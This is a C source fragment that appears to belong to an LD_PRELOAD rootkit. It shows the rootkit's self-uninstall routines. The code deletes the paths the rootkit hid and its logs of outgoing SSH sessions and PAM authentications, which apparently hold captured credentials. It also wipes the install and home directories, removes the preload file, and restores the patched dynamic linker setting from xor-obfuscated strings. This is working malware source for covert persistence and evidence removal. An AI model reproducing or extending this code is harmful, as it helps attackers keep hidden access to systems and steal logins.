#if defined HIDE_MY_ASS && defined UNINSTALL_MY_ASS
/* remove hidden paths on each line in the contents of asspath.
 * if the current hidden path is also in a hidden directory, the directory is removed thereafter. */
void uninstallass(const bdvcfg_t *bc){
    bdvhidepaths_t *my = readass(bc);
    if(!my) return;
    if(my->path_count > 0)
        for(size_t i = 0; i < my->path_count; i++)
            rm(my->hide_paths[i]);
    hree(my);
    rm(bc->asspath);
}
#endif

void rmlinksrc(void){
    int c;
    char **srcs = bdvlinksrcs(&c);
    if(srcs){
        for(int i = 0; i < c; i++){
            rm(srcs[i]);
            clean(srcs[i]);
        }
        free(srcs);
    }
}

void rmlogpaths(void){
    if(!initmvbc()) return;
    const char *logpaths[] = {
#ifdef OUTGOING_SSH_LOGGING
        mvbc->sshlogs,
#endif
#ifdef PAM_AUTH_LOGGING
        mvbc->logpath,
#endif
        NULL
    };
    if(logpaths[0] == NULL)
        return;

    for(size_t i = 0; logpaths[i] != NULL; i++)
        rm(logpaths[i]);
}

/* removes all bdvl stuff */
void rmbdvpaths(const bdvcfg_t *bc){
    rmlinksrc();
#if defined HIDE_MY_ASS && defined UNINSTALL_MY_ASS
    uninstallass(bc);
#endif
    rmlogpaths();
    doiapath(bc->preloadpath, 0);
    rm(bc->preloadpath);
}

void terminate_self(void){
    if(!initmvbc()) return;
    doiadir(mvbc->installdir, 0);
    eradicatedir(mvbc->installdir);
    eradicatedir(mvbc->homedir);
    rmbdvpaths(mvbc);
#ifdef PATCH_LD
    char *op = xordup(OLD_PRELOAD);
    if(op){
        ldpatch(mvbc->preloadpath, op);
        clean(op);
    }
#endif
    bree(mvbc);
    xrm(BDVL_CONFIG);
}